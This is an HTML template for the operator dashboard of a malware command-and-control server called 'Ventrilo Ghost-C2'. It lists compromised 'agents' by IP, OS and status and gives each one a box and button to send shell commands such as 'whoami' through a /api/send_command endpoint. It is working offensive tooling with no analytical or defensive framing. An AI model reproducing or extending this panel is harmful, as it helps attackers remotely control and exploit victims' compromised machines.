<!DOCTYPE html>
<html>
<head>
    <title>Ventrilo Ghost-C2</title>
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        .card { border: 1px solid #00ff00; padding: 10px; margin: 10px; }
    </style>
</head>
<body>
    <h1>VENTRILO GHOST C2 // SayerLinux</h1>
    <div id="agents">
        {% for id, info in agents.items() %}
        <div class="card">
            <h3>Agent: {{ id }}</h3>
            <p>IP: {{ info.ip }} | OS: {{ info.os }} | Status: <span style="color: lime;">{{ info.status }}</span></p>
            <input type="text" id="cmd-{{ id }}" placeholder="Enter Command (e.g. dir, whoami)">
            <button onclick="sendCommand('{{ id }}')">Execute</button>
        </div>
        {% endfor %}
    </div>

    <script>
        function sendCommand(agentId) {
            const cmd = document.getElementById('cmd-' + agentId).value;
            fetch('/api/send_command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({id: agentId, command: cmd})
            })
            .then(res => res.json())
            .then(data => alert(data.status));
        }
    </script>
</body>
</html>
